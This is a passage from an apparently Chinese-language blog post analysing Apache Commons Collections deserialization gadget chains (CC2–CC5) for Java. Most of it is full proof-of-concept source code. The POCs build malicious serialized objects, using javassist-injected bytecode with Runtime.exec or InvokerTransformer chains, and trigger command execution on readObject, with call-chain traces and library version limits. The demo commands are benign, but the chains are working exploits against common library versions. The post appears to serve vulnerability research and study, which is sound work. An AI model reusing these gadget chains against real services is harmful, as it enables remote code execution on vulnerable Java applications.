Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)</span><br><span class="line">                .getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        setField(queue,<span class="string">&quot;queue&quot;</span>,queue_array);</span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置comparator为TransformingComparator,进入siftDownUsingComparator</span></span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-3"   >
          <a href="#解析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-3" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="PriorityQueue-readObject"   >
          <a href="#PriorityQueue-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a><code>PriorityQueue.readObject()</code></h3>
      <p>这里同理需要看一下<code>writeObject</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png" alt="image-20220805165712958"></p>
<p>也是对应读写的，所以可以利用反射设置<code>PriorityQueue</code>的<code>queue</code>，使其可控，然后进入下面的<code>heapify()</code>函数</p>

        <h3 id="PriorityQueue-heapify"   >
          <a href="#PriorityQueue-heapify" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a><code>PriorityQueue.heapify()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png" alt="image-20220805170040301"></p>
<p>再进入<code>siftDown</code></p>

        <h3 id="PriorityQueue-siftDown"   >
          <a href="#PriorityQueue-siftDown" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a><code>PriorityQueue.siftDown()</code></h3>
      <p>其中<code>comparator</code>利用反射设置为<code>TransformingComparator</code>，随后进入<code>siftDownUsingComparator</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png" alt="image-20220805170115164"></p>

        <h3 id="PriorityQueue-siftDownUsingComparator"   >
          <a href="#PriorityQueue-siftDownUsingComparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a><code>PriorityQueue.siftDownUsingComparator()</code></h3>
      <p>调用到实现了<code>Comparator</code>接口的<code>TransformingComparator.comparator()</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png" alt="image-20220805170501655"></p>

        <h3 id="TransformingComparator-comparator"   >
          <a href="#TransformingComparator-comparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformingComparator-comparator" class="headerlink" title="TransformingComparator.comparator()"></a><code>TransformingComparator.comparator()</code></h3>
      <p>那么之前利用反射设置了<code>TransformingComparator.transformer</code>为<code>InvokerTransformer</code>，那么就可以调用到<code>InvokerTransformer.transoform</code>，并且其参数即为这里的<code>obj1</code>，也为<code>PriorityQueue.queue</code>，这个之前设置为了<code>TemplatesImpl</code>，即最后可调用到经典链子<code>ITN</code>，完成利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png" alt="image-20220805170750082"></p>

        <h1 id="三、CC3"   >
          <a href="#三、CC3" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CC3" class="headerlink" title="三、CC3"></a>三、CC3</h1>
      
        <h2 id="JAVA源码版本-8u40-2"   >
          <a href="#JAVA源码版本-8u40-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-2" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png" alt="image-20220806110944484"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>

<p>之后的链子就是经典<code>CITTN</code>链了</p>

        <h2 id="限制-2"   >
          <a href="#限制-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-2"   >
          <a href="#POC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-4"   >
          <a href="#解析-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-4" class="headerlink" title="解析"></a>解析</h2>
      <p>即按照<code>CC1</code>的前半部分链子加上经典的<code>CITTN</code>即可，不过多赘述了</p>

        <h1 id="四、CC4"   >
          <a href="#四、CC4" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、CC4" class="headerlink" title="四、CC4"></a>四、CC4</h1>
      
        <h2 id="JAVA源码版本-8u40-3"   >
          <a href="#JAVA源码版本-8u40-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-3" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807120904293.png" alt="image-20220807120904293"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter构造函数</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-3"   >
          <a href="#限制-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>
<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="POC-3"   >
          <a href="#POC-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        <span class="comment">//不用设置PriorityQueue.queue为TemplatesImpl,因为TrAXFilter构造函数可以直接触发</span></span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc4&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-5"   >
          <a href="#解析-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-5" class="headerlink" title="解析"></a>解析</h2>
      <p>感觉和<code>CC2</code>差不多，就是后面的利用链子，由于是<code>TrAXFilter</code>构造函数直接触发的，所以不用设置<code>PriorityQueue.queue</code>为<code>TemplatesImpl</code>，没有什么太多的亮点。</p>

        <h1 id="五、CC5"   >
          <a href="#五、CC5" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、CC5" class="headerlink" title="五、CC5"></a>五、CC5</h1>
      
        <h2 id="JAVA源码版本-8u40-4"   >
          <a href="#JAVA源码版本-8u40-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-4" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801095044379.png" alt="image-20220801095044379"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">TiedMapEntry.toString()-&gt;getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-4"   >
          <a href="#限制-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-4"   >
          <a href="#POC-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span 